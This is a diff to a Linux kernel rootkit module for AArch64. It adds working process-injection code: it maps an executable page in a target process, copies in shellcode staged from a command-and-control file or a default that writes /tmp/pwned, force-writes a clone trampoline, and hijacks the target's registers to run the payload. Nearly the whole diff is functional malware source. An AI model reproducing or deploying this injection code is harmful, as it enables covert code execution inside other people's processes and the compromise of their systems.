@@ -33,6 +33,79 @@
 
 #include "rootkit.h"
 
+/* AArch64 instruction encoding helpers */
+
+static u32 encode_movz(int rd, u16 imm16, int shift)
+{
+	int hw = shift / 16;
+	return 0xD2800000 | (hw << 21) | ((u32)imm16 << 5) | rd;
+}
+
+static u32 encode_movk(int rd, u16 imm16, int shift)
+{
+	int hw = shift / 16;
+	return 0xF2800000 | (hw << 21) | ((u32)imm16 << 5) | rd;
+}
+
+static u32 encode_svc(u16 imm)
+{
+	return 0xD4000001 | ((u32)imm << 5);
+}
+
+static u32 encode_br(int rn)
+{
+	return 0xD61F0000 | (rn << 5);
+}
+
+static u32 encode_movn(int rd, u16 imm16, int shift)
+{
+	int hw = shift / 16;
+	return 0x92800000 | (hw << 21) | ((u32)imm16 << 5) | rd;
+}
+
+static u32 encode_cbz(int rt, int offset_insns)
+{
+	u32 imm19 = (u32)(offset_insns & 0x7FFFF);
+	return 0xB4000000 | (imm19 << 5) | rt;
+}
+
+static int emit_load_imm64(u32 *buf, int idx, int rd, unsigned long addr)
+{
+	buf[idx++] = encode_movz(rd, (addr >> 0) & 0xFFFF, 0);
+	buf[idx++] = encode_movk(rd, (addr >> 16) & 0xFFFF, 16);
+	buf[idx++] = encode_movk(rd, (addr >> 32) & 0xFFFF, 32);
+	buf[idx++] = encode_movk(rd, (addr >> 48) & 0xFFFF, 48);
+	return idx;
+}
+
+
+/* Clone trampoline builder */
+
+static int build_trampoline(u32 *buf, unsigned long stack_va)
+{
+	int i = 0;
+	unsigned long stack_top = stack_va + PAGE_SIZE - 16;
+
+	/* x0 = CLONE_VM(0x100)|CLONE_THREAD(0x10000)|CLONE_SIGHAND(0x800) = 0x10900 */
+	buf[i++] = encode_movz(0, 0x0900, 0);
+	buf[i++] = encode_movk(0, 0x0001, 16);
+
+	i = emit_load_imm64(buf, i, 1, stack_top);   /* x1 = stack top */
+
+	buf[i++] = encode_movz(2, 0, 0);              /* x2 = 0 (parent_tidptr) */
+	buf[i++] = encode_movz(3, 0, 0);              /* x3 = 0 (tls) */
+	buf[i++] = encode_movz(4, 0, 0);              /* x4 = 0 (child_tidptr) */
+	buf[i++] = encode_movz(8, 220, 0);            /* x8 = __NR_clone */
+	buf[i++] = encode_svc(0);
+
+	buf[i++] = encode_cbz(0, 3);                  /* cbz x0, child (+3) */
+	buf[i++] = encode_movn(0, 3, 0);              /* parent: x0 = ~3 = -4 = -EINTR */
+	buf[i++] = encode_br(28);                     /* parent: br x28 */
+	buf[i++] = encode_br(27);                     /* child:  br x27 */
+
+	return i;
+}
+
 /*
  * Default test shellcode: assembled from tools/inject_test.S
  * Creates /tmp/pwned with "INJECTED-1337 pid=<pid> ppid=<ppid>"
@@ -69,6 +142,33 @@ static const unsigned char shellcode_default[] = {
 	0x31, 0x33, 0x33, 0x37, 0x20, 0x70, 0x69, 0x64, 0x3d, 0x20, 0x70, 0x70,
 	0x69, 0x64, 0x3d, 0x0a
 };
+
+
+/* find_exec_addr */ 
+//Find a VM_EXEC page in the target's address space suitable for writing the clone trampoline.
+//Returns an address 0x100 bytes into the first exec VMA that has enough room, or 0 on failure.
+
+static unsigned long find_exec_addr(struct task_struct *task, size_t need)
+{
+	struct vm_area_struct *vma;
+	unsigned long addr = 0;
+
+	if (!task->mm)
+		return 0;
+
+	mmap_read_lock(task->mm);
+	VMA_ITERATOR(iter, task->mm, 0);
+	for_each_vma(iter, vma) {
+		if (!(vma->vm_flags & VM_EXEC))
+			continue;
+		if (vma->vm_start + 0x100 + need > vma->vm_end)
+			continue;
+		addr = vma->vm_start + 0x100;
+		break;
+	}
+	mmap_read_unlock(task->mm);
+	return addr;
+}
 
 /*
  * load_staged_shellcode - read shellcode from C2_INJECT_STAGING and unlink it.
@@ -121,23 +221,141 @@ static void *load_staged_shellcode(size_t *len_out)
 	}
 
 	*len_out = size;
-	pr_info("rootkit: loaded %zd bytes from staging file\n", n);
+	pr_info("[rootkit] loaded %zd bytes from staging file\n", n);
 	return buf;
 }
 
 int inject_trigger(pid_t target)
 {
-	/* TODO */
-	return -ENOSYS;
+	struct task_struct *task;
+	struct mm_struct *mm;
+	struct pt_regs *regs;
+	unsigned long inject_addr, stack_addr, exec_addr;
+	void *sc_buf = NULL;
+	size_t sc_len = 0;
+	bool sc_allocated = false;
+	u32 trampoline[32];
+	int tramp_len, ret;
+ 
+	rcu_read_lock();
+	task = find_task_by_vpid(target);
+	if (task)
+		get_task_struct(task);
+	rcu_read_unlock();
+ 
+	if (!task) {
+		pr_err("[inject] PID %d not found\n", target);
+		return -ESRCH;
+	}
+ 
+	mm = task->mm;
+	if (!mm) {
+		pr_err("[inject] PID %d has no mm\n", target);
+		put_task_struct(task);
+		return -EINVAL;
+	}
+ 
+	pr_info("[inject] target PID %d (%s)\n", target, task->comm);
+ 
+ 
+	sc_buf = load_staged_shellcode(&sc_len);
+	if (sc_buf) {
+		sc_allocated = true;
+	} else {
+		sc_buf = (void *)shellcode_default;
+		sc_len = sizeof(shellcode_default);
+		pr_info("[inject] using default shellcode (%zu bytes)\n", sc_len);
+	}
+ 
+ 
+	mmgrab(mm);
+	kthread_use_mm(mm);
+ 
+	inject_addr = vm_mmap(NULL, 0, PAGE_SIZE,
+			     PROT_READ | PROT_WRITE | PROT_EXEC,
+			     MAP_ANONYMOUS | MAP_PRIVATE, 0);
+	if (IS_ERR_VALUE(inject_addr)) {
+		pr_err("[inject] code vm_mmap failed: %ld\n", (long)inject_addr);
+		ret = (int)inject_addr;
+		goto out_unuse;
+	}
+	pr_info("[inject] code page at %lx\n", inject_addr);
+ 
+	if (copy_to_user((void __user *)inject_addr, sc_buf, sc_len)) {
+		pr_err("[inject] copy_to_user (code) failed\n");
+		ret = -EFAULT;
+		goto out_unuse;
+	}
+ 
+	stack_addr = vm_mmap(NULL, 0, PAGE_SIZE,
+			    PROT_READ | PROT_WRITE,
+			    MAP_ANONYMOUS | MAP_PRIVATE, 0);
+	if (IS_ERR_VALUE(stack_addr)) {
+		pr_err("[inject] stack vm_mmap failed: %ld\n", (long)stack_addr);
+		ret = (int)stack_addr;
+		goto out_unuse;
+	}
+	pr_info("[inject] stack page at %lx\n", stack_addr);
+ 
+	kthread_unuse_mm(mm);
+	mmdrop(mm);
+ 
+	tramp_len = build_trampoline(trampoline, stack_addr);
+ 
+	exec_addr = find_exec_addr(task, tramp_len * sizeof(u32));
+	if (!exec_addr) {
+		pr_err("[inject] no exec region found in PID %d\n", target);
+		ret = -ENOMEM;
+		goto out_put;
+	}
+ 
+	ret = access_process_vm(task, exec_addr, trampoline,
+				tramp_len * sizeof(u32),
+				FOLL_WRITE | FOLL_FORCE);
+	if (ret != tramp_len * (int)sizeof(u32)) {
+		pr_err("[inject] trampoline write failed: %d\n", ret);
+		ret = -EIO;
+		goto out_put;
+	}
+	pr_info("[inject] trampoline at %lx\n", exec_addr);
+ 
+	/* --- 6. Hijack target registers --- */
+ 
+	regs = task_pt_regs(task);
+	regs->regs[28] = regs->pc;       /* save original PC for parent return */
+	regs->regs[27] = inject_addr;    /* payload VA for child */
+	regs->pc = exec_addr;            /* redirect to trampoline */
+	regs->syscallno = ~0UL;          /* prevent syscall restart */
+ 
+	/* Force target to wake and return to userspace */
+	set_tsk_thread_flag(task, TIF_SIGPENDING);
+	wake_up_process(task);
+ 
+	pr_info("[inject] injection complete: PID %d code=%lx tramp=%lx\n",
+		target, inject_addr, exec_addr);
+ 
+	if (sc_allocated)
+		kfree(sc_buf);
+	put_task_struct(task);
+	return 0;
+ 
+out_unuse:
+	kthread_unuse_mm(mm);
+	mmdrop(mm);
+out_put:
+	if (sc_allocated)
+		kfree(sc_buf);
+	put_task_struct(task);
+	return ret;
 }
 
 int inject_init(void)
 {
-	pr_info("rootkit: injection subsystem ready\n");
+	pr_info("[inject] injection subsystem ready\n");
 	return 0;
 }
 
 void inject_exit(void)
 {
-	pr_info("rootkit: injection subsystem cleaned up\n");
+	pr_info("[inject] injection subsystem cleaned up\n");
 }
